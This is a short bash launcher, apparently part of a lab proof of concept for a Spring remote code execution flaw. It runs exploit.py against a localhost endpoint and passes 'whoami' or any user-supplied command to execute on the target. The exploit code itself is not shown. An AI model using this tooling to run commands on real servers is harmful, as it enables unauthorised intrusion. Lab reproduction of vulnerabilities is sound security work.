#!/bin/bash

if [ $# -eq 0 ]
    then
        python3 exploit.py --url http://localhost:8080/spring-rce-poc/poc --cmd 'whoami'
        
    else
        python3 exploit.py --url http://localhost:8080/spring-rce-poc/poc --cmd "$1"
fi

exit 0
